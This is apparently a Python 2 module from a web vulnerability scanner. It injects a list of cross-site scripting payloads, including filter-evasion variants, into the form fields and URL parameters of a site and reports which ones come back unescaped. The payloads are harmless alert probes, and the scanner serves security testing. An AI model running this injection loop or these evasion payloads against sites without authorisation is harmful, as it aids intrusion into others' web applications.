from utils import create_form_selector, add_url_params, get_url_host, INPUT_TYPE_DICT, SCRIPTABLE_ATTRS
from urlparse import urlparse, urlunparse, parse_qsl, urljoin
from urllib import urlencode
from client import NotAPage, RedirectedToExternal

import requests
import copy
import sys
import time

POST, GET = 'POST', 'GET'

XSS_STRING = 'xssed'
INJECTIONS = (
    "\"><script>alert('xssed')</script>",
    "\"><sCriPt>alert('xssed')</sCriPt>",
    "\"; alert('xssed')",
    "\"></sCriPt><sCriPt >alert('xssed')</sCriPt>",
    "\"><img Src=0x94 onerror=alert('xssed')>",
    "\"><BODY ONLOAD=alert('xssed')>",
    "'%2Balert('xssed')%2B'",
    "\"><'xssed'>",
    "'+alert('xssed')+'",
    "%2Balert('xssed')%2B'",
    "'\"--></style></script><script>alert('xssed')</script>",
    "'</style></script><script>alert('xssed')</script>",
    "</script><script>alert('xssed')</script>",
    "</style></script><script>alert('xssed')</script>",
    "'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3E0x94('xssed')%3C",
    "'\"--></style></script><script>alert('xssed')</script>",
    "';alert('xssed')'",
    "<scr<script>ipt>alert('xssed')</script>",
    "<scr<script>ipt>alert('xssed')</scr</script>ipt>",
    "\"<scr<script>ipt>alert('xssed')</scr</script>ipt>",
    "\"><scr<script>ipt>alert('xssed')</script>",
    "\">'</style></script><script>alert('xssed')</script>",
    "\"></script><script>alert('xssed')</script>",
    "\"></style></script><script>alert('xssed')</script>",
    "<IMG SRC=\" &#14;  javascript:alert('xssed');\">",
    "</title>\"><a href=\"javascript:alert('xssed');\">",
    "</title>\"><iframe onerror=\"alert('xssed');\" src=x></iframe>",
    "<embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzZWQnKTwvc2NyaXB0Pg==\">",
    "<img src=x onerror=alert('xssed')>",
    "<scri%00pt>alert('xssed');</scri%00pt>",
    "<svg/onload=prompt('xssed');>",
    "<iframe/src=\"data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KCd4c3NlZCcpPg==\">"
)

def xss(page, client):
    parsed_url = urlparse(page.url)

    if parsed_url.query:
        url_xss_report = hpp(parsed_url, client)
        if url_xss_report:
            print 'HTTP Parameter Pollution in url {}. params {}'.format(page.url, url_xss_report.keys())

    for form in page.get_forms():
        report = {}
        action = urljoin(page.url, form.get('action'))

        if get_url_host(page.url) != get_url_host(action):
            continue

        method = form.get('method') or GET
        injectable, immutable = get_form_params(form)

        for param in injectable.keys():
            successed = []

            for injection in INJECTIONS:
                inject = inject_param(injectable, param, injection)
                inject.update(immutable)

                try:
                    if method.lower() == POST.lower():
                        res_page = client.post_req(action, data=inject)
                    else:
                        injected_url = add_url_params(action, inject)
                        res_page = client.get_req(injected_url)
                except NotAPage:
                    continue
                except RedirectedToExternal:
                    continue

                result = res_page.document.find_all(contains_injection)
                if result:
                    successed.append(injection)

            if successed:
                report.update({param: successed})
        if report:
            print 'Cross Site Scripting (XSS) in url {} on form {}. params {}'.format(page.url, form.get('action'), report.keys())

def contains_injection(tag):
    return any(k in SCRIPTABLE_ATTRS and XSS_STRING in v \
        or k in ('src', 'href') and "javascript:alert('xssed')" in v for k, v in tag.attrs.iteritems()) \
        or tag.name == 'script' and list(tag.strings) and XSS_STRING in list(tag.strings)[0]


def inject_param(parameters, param, injection):
    injected = copy.deepcopy(parameters)
    injected[param] += injection
    return injected

def get_form_params(form):
    injectable, immutable = {}, {}
    immutable_types = ['submit', 'button', 'hidden']
    inputs = form.find_all('input')
    textareas = form.find_all('textarea')

    for inpt in inputs:
        name = str(inpt.get('name') or '')
        if not name:
            continue
        itype = inpt.get('type')
        value = str(inpt.get('value') or INPUT_TYPE_DICT[itype])
        if itype in immutable_types:
            immutable[name] = value
        else:
            injectable[name] = value


    for txt in textareas:
        name = str(txt.get('name'))
        value = str(txt.text or INPUT_TYPE_DICT['text'])
        injectable[name] = value

    return [injectable, immutable]

def hpp(url, client):
    """HTTP Parameter Pollution (HPP)"""
    url_parts = list(url)
    query = dict(parse_qsl(url_parts[4]))

    report = {}

    for param, value in query.iteritems():
        successed = []
        for injection in INJECTIONS:
            inj_query = copy.deepcopy(query)
            inj_query.update({param: value + injection})
            url_parts[4] = urlencode(inj_query)
            injected_url = urlunparse(url_parts)

            res_page = client.get_req(injected_url)
            result = res_page.document.find_all(contains_injection)

            if result:
                successed.append(injection)

        if successed:
            report.update({param: successed})

    return report
